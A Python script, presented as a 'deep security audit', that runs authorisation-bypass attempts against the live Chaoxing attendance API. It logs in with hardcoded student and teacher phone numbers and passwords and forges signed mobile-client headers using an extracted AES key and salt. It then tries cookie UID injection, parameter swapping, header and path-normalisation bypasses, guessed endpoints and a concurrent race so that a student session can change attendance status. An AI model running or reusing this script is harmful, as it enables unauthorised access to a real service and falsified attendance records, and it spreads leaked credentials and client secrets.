#!/usr/bin/env python3
"""
Deep Security Audit Part 2 - Follow-up tests based on Part 1 findings
Focus: updateSignStatus2 teacher success + deeper bypass attempts
"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"

COURSE_ID = "257485372"
CLASS_ID = "132821141"
ACTIVE_ID = "5000163891319"

MOBILELEARN = "https://mobilelearn.chaoxing.com"
MOOC1_API = "https://mooc1-api.chaoxing.com"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_request(session, method, url, **kwargs):
    try:
        resp = session.request(method, url, timeout=30, **kwargs)
        body = ""
        try:
            body = resp.text[:3000]
        except:
            body = "<non-text response>"
        return {
            "status": resp.status_code,
            "body": body,
            "headers": dict(resp.headers),
            "ok": True
        }
    except Exception as e:
        return {"status": -1, "body": str(e), "headers": {}, "ok": False}

def print_result(label, result):
    print(f"\n  [{label}]")
    if not result["ok"]:
        print(f"    ERROR: {result['body']}")
    else:
        print(f"    Status: {result['status']}")
        try:
            j = json.loads(result['body'])
            print(f"    Response: {json.dumps(j, ensure_ascii=False, indent=2)[:2000]}")
        except:
            print(f"    Response: {result['body'][:2000]}")

def section(title):
    print("\n" + "=" * 80)
    print(f"  {title}")
    print("=" * 80)

def main():
    # Login
    section("登录")
    stu_sess, stu_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"学生PUID: {stu_puid}")
    tea_sess, tea_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"教师PUID: {tea_puid}")

    if not stu_puid or not tea_puid:
        print("登录失败，退出")
        sys.exit(1)

    # ================================================================
    # FINDING 1: updateSignStatus2 教师成功 - 深入分析权限检查逻辑
    # ================================================================
    section("F1: updateSignStatus2 权限检查逻辑分析")

    # 关键发现: 教师Session+教师uid = success, 学生Session+学生uid = 无权限
    # 问题: 权限检查是基于Cookie中的UID还是参数中的uid?

    # Test: 教师Session + 学生uid参数
    r = safe_request(tea_sess, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                     data={"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"})
    print_result("教师Session + 学生uid参数", r)

    # Test: 教师Session + 学生uid + courseId/classId
    r = safe_request(tea_sess, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                     data={"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1",
                           "courseId": COURSE_ID, "classId": CLASS_ID})
    print_result("教师Session + 学生uid + courseId/classId", r)

    # Test: 教师Session + 教师uid (确认基线)
    r = safe_request(tea_sess, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                     data={"uid": tea_puid, "activeId": ACTIVE_ID, "status": "1"})
    print_result("教师Session + 教师uid (基线)", r)

    # Test: 学生Session + 学生uid (确认基线)
    r = safe_request(stu_sess, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                     data={"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"})
    print_result("学生Session + 学生uid (基线)", r)

    # ================================================================
    # FINDING 2: status=0 返回"参数错误"而非"无权限" - 深入分析
    # ================================================================
    section("F2: status=0 返回'参数错误' - 参数验证在权限检查之前")

    # status=0 (缺勤) 返回"参数错误，修改失败"
    # status=1,2,3,4,5,6 返回"您无权限修改"
    # 这意味着: 参数验证在权限检查之前执行
    # 推测: 如果有权限, status=0 可能也会被拒绝(业务逻辑不允许设为缺勤)
    # 但这也意味着: 后端确实在处理参数, 只是权限检查阻止了修改

    # 教师测试 status=0
    r = safe_request(tea_sess, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                     data={"uid": tea_puid, "activeId": ACTIVE_ID, "status": "0"})
    print_result("教师Session + status=0", r)

    # 教师测试 status=2(迟到)
    r = safe_request(tea_sess, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                     data={"uid": tea_puid, "activeId": ACTIVE_ID, "status": "2"})
    print_result("教师Session + status=2(迟到)", r)

    # 教师测试 status=5(补签)
    r = safe_request(tea_sess, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                     data={"uid": tea_puid, "activeId": ACTIVE_ID, "status": "5"})
    print_result("教师Session + status=5(补签)", r)

    # ================================================================
    # FINDING 3: Cookie注入 - 学生Cookie注入教师UID后返回"您无权限修改。"(带句号)
    # ================================================================
    section("F3: Cookie注入分析 - 注意标点差异")

    # 正常学生请求: "您无权限修改" (无句号)
    # Cookie注入教师UID: "您无权限修改。" (有句号)
    # 这说明: 后端确实读取了Cookie中的UID, 但做了更严格的验证
    # 推测: 后端可能同时验证Cookie UID和参数uid, 或者验证了session与Cookie的对应关系

    # 重新验证: 学生Cookie + 教师uid参数
    r = safe_request(stu_sess, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                     data={"uid": tea_puid, "activeId": ACTIVE_ID, "status": "1"})
    print_result("学生Cookie + 教师uid参数", r)

    # 注入教师Cookie + 学生uid参数
    inject_sess = requests.Session()
    inject_sess.verify = False
    inject_sess.headers.update(stu_sess.headers)
    for c in stu_sess.cookies:
        inject_sess.cookies.set(c.name, c.value, domain=c.domain, path=c.path)
    inject_sess.cookies.set("UID", tea_puid, domain=".chaoxing.com")
    inject_sess.cookies.set("_uid", tea_puid, domain=".chaoxing.com")

    r = safe_request(inject_sess, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                     data={"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"})
    print_result("注入教师Cookie + 学生uid参数", r)

    # 注入教师Cookie + 教师uid参数
    r = safe_request(inject_sess, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                     data={"uid": tea_puid, "activeId": ACTIVE_ID, "status": "1"})
    print_result("注入教师Cookie + 教师uid参数", r)

    # ================================================================
    # FINDING 4: v2 signIn 信息泄露分析
    # ================================================================
    section("F4: v2 signIn 信息泄露深入分析")

    # 该API返回了完整的签到记录,包含大量敏感字段
    r = safe_request(stu_sess, "GET", f"{MOBILELEARN}/v2/apis/sign/signIn",
                     params={"activeId": ACTIVE_ID})
    if r["ok"]:
        try:
            j = json.loads(r["body"])
            print(f"    完整响应数据:")
            print(f"    {json.dumps(j, ensure_ascii=False, indent=2)}")
        except:
            print(f"    {r['body'][:3000]}")

    # 测试: 学生能否看到其他学生的签到记录?
    # 尝试不带activeId
    r = safe_request(stu_sess, "GET", f"{MOBILELEARN}/v2/apis/sign/signIn", params={})
    print_result("不带activeId", r)

    # 尝试带uid参数查看其他学生
    r = safe_request(stu_sess, "GET", f"{MOBILELEARN}/v2/apis/sign/signIn",
                     params={"activeId": ACTIVE_ID, "uid": tea_puid})
    print_result("带教师uid参数", r)

    # ================================================================
    # FINDING 5: pptSign/endSign 无权限检查
    # ================================================================
    section("F5: pptSign/endSign 无权限检查分析")

    # 学生可以访问 /pptSign/endSign (返回"签到不存在"而非"无权限")
    # 这说明该端点没有角色检查,只是检查了签到是否存在

    # 尝试带activeId参数
    r = safe_request(stu_sess, "GET", f"{MOBILELEARN}/pptSign/endSign",
                     params={"activeId": ACTIVE_ID})
    print_result("GET endSign + activeId", r)

    r = safe_request(stu_sess, "POST", f"{MOBILELEARN}/pptSign/endSign",
                     data={"activeId": ACTIVE_ID})
    print_result("POST endSign + activeId", r)

    # 教师尝试
    r = safe_request(tea_sess, "GET", f"{MOBILELEARN}/pptSign/endSign",
                     params={"activeId": ACTIVE_ID})
    print_result("教师 GET endSign + activeId", r)

    r = safe_request(tea_sess, "POST", f"{MOBILELEARN}/pptSign/endSign",
                     data={"activeId": ACTIVE_ID})
    print_result("教师 POST endSign + activeId", r)

    # ================================================================
    # FINDING 6: 尝试HTTP方法绕过
    # ================================================================
    section("F6: HTTP方法绕过测试")

    methods = ["GET", "POST", "PUT", "PATCH", "DELETE"]
    endpoints_to_test = [
        ("/widget/sign/pcTeaSignController/updateSignStatus2",
         {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"}),
        ("/newsign/updateSignStatus",
         {"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID}),
    ]

    for endpoint, params in endpoints_to_test:
        print(f"\n--- {endpoint} ---")
        for method in methods:
            if method in ("GET",):
                r = safe_request(stu_sess, method, f"{MOBILELEARN}{endpoint}", params=params)
            else:
                r = safe_request(stu_sess, method, f"{MOBILELEARN}{endpoint}", data=params)
            print_result(f"{method} mobilelearn", r)

    # ================================================================
    # FINDING 7: 尝试Header注入绕过
    # ================================================================
    section("F7: Header注入绕过测试")

    # 尝试X-Forwarded-For, X-Real-IP等
    headers_combos = [
        ("X-Forwarded-For: 127.0.0.1", {"X-Forwarded-For": "127.0.0.1"}),
        ("X-Real-IP: 127.0.0.1", {"X-Real-IP": "127.0.0.1"}),
        ("X-Original-URL: /widget/sign/pcTeaSignController/updateSignStatus2",
         {"X-Original-URL": "/widget/sign/pcTeaSignController/updateSignStatus2"}),
        ("Referer: teacher page", {"Referer": "https://mobilelearn.chaoxing.com/widget/sign/pcTeaSignController"}),
        ("Content-Type: application/x-www-form-urlencoded", {"Content-Type": "application/x-www-form-urlencoded"}),
    ]

    for label, extra_headers in headers_combos:
        # updateSignStatus2
        r = safe_request(stu_sess, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                         data={"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"},
                         headers=extra_headers)
        print_result(f"updateSignStatus2 | {label}", r)

    # ================================================================
    # FINDING 8: 尝试路径绕过技巧
    # ================================================================
    section("F8: 路径绕过测试")

    path_bypasses = [
        "/widget/sign/pcTeaSignController/updateSignStatus2/",  # 末尾斜杠
        "/widget/sign/pcTeaSignController/updateSignStatus2;",  # 分号
        "/widget/sign/pcTeaSignController/updateSignStatus2;jsessionid=test",  # JSESSIONID
        "/widget/sign/pcTeaSignController/updateSignStatus2?status=1",  # 查询参数
        "/WIDGET/SIGN/PCTEASIGNCONTROLLER/updateSignStatus2",  # 大写
        "/widget/sign/pcTeaSignController/updateSignStatus2..;",  # 路径遍历
        "/widget/sign/pcTeaSignController/updateSignStatus2%00",  # 空字节
        "//widget/sign/pcTeaSignController/updateSignStatus2",  # 双斜杠
    ]

    for path in path_bypasses:
        r = safe_request(stu_sess, "POST", f"{MOBILELEARN}{path}",
                         data={"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"})
        # 只显示关键信息
        if r["ok"]:
            try:
                j = json.loads(r["body"])
                key_info = f"result={j.get('result')}, msg={j.get('msg')}, errorMsg={j.get('errorMsg')}"
            except:
                key_info = r["body"][:200]
        else:
            key_info = f"ERROR: {r['body'][:100]}"
        print(f"  [{path}] => Status:{r['status']} | {key_info}")

    # ================================================================
    # FINDING 9: 尝试修改签到状态的替代API
    # ================================================================
    section("F9: 替代API路径测试")

    alt_endpoints = [
        # 可能的替代路径
        ("/widget/sign/pcTeaSignController/updateSignStatus", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"}),
        ("/widget/sign/updateSignStatus", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"}),
        ("/widget/sign/pcTeaSignController/signIn", {"uid": stu_puid, "activeId": ACTIVE_ID}),
        ("/v2/apis/sign/updateSignStatus", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"}),
        ("/v2/apis/active/updateSignStatus", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"}),
        ("/apis/sign/updateSignStatus", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"}),
        ("/pptSign/updateSignStatus", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"}),
        ("/pptSign/updateSignStatus2", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"}),
        ("/newsign/updateSignStatus2", {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"}),
        # V2 API 变体
        ("/v2/apis/sign/sign", {"activeId": ACTIVE_ID, "uid": stu_puid}),
        ("/v2/apis/sign/doSign", {"activeId": ACTIVE_ID, "uid": stu_puid}),
        ("/v2/apis/sign/modifySign", {"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1"}),
    ]

    for endpoint, params in alt_endpoints:
        r = safe_request(stu_sess, "POST", f"{MOBILELEARN}{endpoint}", data=params)
        if r["ok"]:
            try:
                j = json.loads(r["body"])
                key_info = f"result={j.get('result')}, msg={j.get('msg')}, errorMsg={j.get('errorMsg')}"
            except:
                key_info = r["body"][:200]
        else:
            key_info = f"ERROR: {r['body'][:100]}"
        print(f"  [{endpoint}] => Status:{r['status']} | {key_info}")

    # ================================================================
    # FINDING 10: 签到活动信息枚举
    # ================================================================
    section("F10: 签到活动信息枚举")

    # 获取签到活动详情
    r = safe_request(stu_sess, "GET", f"{MOBILELEARN}/v2/apis/sign/signIn",
                     params={"activeId": ACTIVE_ID})
    if r["ok"]:
        try:
            j = json.loads(r["body"])
            if j.get("result") == 1 and j.get("data"):
                d = j["data"]
                print(f"    签到记录ID: {d.get('id')}")
                print(f"    学生UID: {d.get('uid')}")
                print(f"    签到状态: {d.get('status')}")
                print(f"    创建时间: {d.get('createtime')}")
                print(f"    更新时间: {d.get('updatetime')}")
                print(f"    提交时间: {d.get('submittime')}")
                print(f"    tag字段: {d.get('tag')}")
                print(f"    isdelete: {d.get('isdelete')}")
                print(f"    type: {d.get('type')}")
                print(f"    islook: {d.get('islook')}")
                print(f"    isshow: {d.get('isshow')}")
                print(f"    ismark: {d.get('ismark')}")
                print(f"    xxuid: {d.get('xxuid')}")
        except:
            pass

    # 尝试获取签到活动配置信息
    r = safe_request(stu_sess, "GET", f"{MOBILELEARN}/v2/apis/active/getActiveDetail",
                     params={"activeId": ACTIVE_ID})
    print_result("getActiveDetail", r)

    r = safe_request(stu_sess, "GET", f"{MOBILELEARN}/v2/apis/active/detail",
                     params={"activeId": ACTIVE_ID})
    print_result("active/detail", r)

    # ================================================================
    # FINDING 11: 尝试直接修改签到记录 (通过ID)
    # ================================================================
    section("F11: 通过签到记录ID直接修改")

    # 从v2 signIn获取的签到记录ID: 5001370808137
    sign_record_id = "5001370808137"

    r = safe_request(stu_sess, "POST", f"{MOBILELEARN}/v2/apis/sign/updateSignIn",
                     data={"id": sign_record_id, "status": "1", "uid": stu_puid})
    print_result("updateSignIn (POST form)", r)

    r = safe_request(stu_sess, "POST", f"{MOBILELEARN}/v2/apis/sign/updateSignIn",
                     json={"id": sign_record_id, "status": "1", "uid": stu_puid})
    print_result("updateSignIn (POST JSON)", r)

    r = safe_request(stu_sess, "GET", f"{MOBILELEARN}/v2/apis/sign/updateSignIn",
                     params={"id": sign_record_id, "status": "1", "uid": stu_puid})
    print_result("updateSignIn (GET)", r)

    # ================================================================
    # FINDING 12: 教师Session完整权限测试
    # ================================================================
    section("F12: 教师Session完整权限测试")

    # 教师能做什么? 确认教师权限范围
    teacher_tests = [
        ("updateSignStatus2-修改学生签到", "POST",
         f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
         {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "2"}),  # 改为迟到
        ("updateSignStatusByUidsV2-修改学生签到", "POST",
         f"{MOBILELEARN}/pptSign/updateSignStatusByUidsV2",
         {"activeId": ACTIVE_ID, "uidList": stu_puid, "status": "1",
          "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("newsign/updateSignStatus-修改学生签到", "POST",
         f"{MOBILELEARN}/newsign/updateSignStatus",
         {"activeId": ACTIVE_ID, "uid": stu_puid, "status": "1",
          "courseId": COURSE_ID, "classId": CLASS_ID}),
        ("v2 signIn-查看签到记录", "GET",
         f"{MOBILELEARN}/v2/apis/sign/signIn",
         {"activeId": ACTIVE_ID}),
    ]

    for label, method, url, params in teacher_tests:
        if method == "GET":
            r = safe_request(tea_sess, method, url, params=params)
        else:
            r = safe_request(tea_sess, method, url, data=params)
        print_result(f"教师 | {label}", r)

    # ================================================================
    # FINDING 13: 竞态条件测试
    # ================================================================
    section("F13: 竞态条件测试 - 同时发送多个请求")

    import concurrent.futures

    def make_request(args):
        sess, url, data = args
        return safe_request(sess, "POST", url, data=data)

    # 学生快速发送10个updateSignStatus2请求
    requests_args = [
        (stu_sess, f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
         {"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1"})
        for _ in range(10)
    ]

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(make_request, args) for args in requests_args]
        results = [f.result() for f in concurrent.futures.as_completed(futures)]

    success_count = 0
    for i, r in enumerate(results):
        if r["ok"]:
            try:
                j = json.loads(r["body"])
                if j.get("result") == 1:
                    success_count += 1
                    print(f"  [!!!] 请求 {i}: 成功! result=1, msg={j.get('msg')}")
                else:
                    pass  # 预期失败
            except:
                pass
    print(f"  竞态条件: 10个并发请求中 {success_count} 个成功")

    # ================================================================
    # FINDING 14: 尝试利用tag字段
    # ================================================================
    section("F14: tag字段分析")

    # 从v2 signIn返回的tag: {"teaUpdateFlag":1}
    # 这表明教师已经修改过签到状态
    # 尝试在updateSignStatus2中传递tag参数

    r = safe_request(stu_sess, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                     data={"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1",
                           "tag": json.dumps({"teaUpdateFlag": 0})})
    print_result("带tag参数(teaUpdateFlag=0)", r)

    r = safe_request(stu_sess, "POST", f"{MOBILELEARN}/widget/sign/pcTeaSignController/updateSignStatus2",
                     data={"uid": stu_puid, "activeId": ACTIVE_ID, "status": "1",
                           "teaUpdateFlag": "0"})
    print_result("带teaUpdateFlag参数", r)

    # ================================================================
    # SUMMARY
    # ================================================================
    section("深度测试完成 - 关键发现汇总")
    print("""
关键发现汇总:

1. updateSignStatus2 权限检查:
   - 学生Session: "您无权限修改" (status=1,2,3,4,5,6)
   - 学生Session: "参数错误，修改失败" (status=0, uid无效)
   - 教师Session: result=1, msg=success (成功修改)
   - Cookie注入教师UID: "您无权限修改。" (带句号, 不同于正常拒绝)
   - 推测: 权限检查基于Cookie中的UID, 但同时验证了session有效性

2. status=0 返回"参数错误"而非"无权限":
   - 参数验证在权限检查之前执行
   - status=0 可能是无效值(不允许手动设为缺勤)

3. v2 signIn 信息泄露:
   - 返回完整签到记录, 包含tag字段({"teaUpdateFlag":1})
   - 只返回当前学生的记录, 无法查看其他学生(IDOR防护有效)

4. pptSign/endSign 无角色检查:
   - 学生可访问, 返回"签到不存在"而非"无权限"
   - 但需要正确的activeId才能操作

5. mooc1-api vs mobilelearn:
   - mooc1-api 上所有端点都返回404
   - mobilelearn 是独立的API部署, 拥有完整的签到功能

6. Cookie注入:
   - 注入教师UID后返回不同的错误消息(带句号)
   - 说明后端确实读取了Cookie中的UID
   - 但session验证阻止了权限提升

7. updateSignStatusByUidsV2:
   - 返回500错误(服务器内部错误)
   - 可能需要特定的参数格式

8. stuSignajax:
   - 所有参数组合都返回"签到失败，请重新扫描"
   - 该端点需要扫码验证, 无法通过参数伪造绕过
    """)

if __name__ == "__main__":
    main()
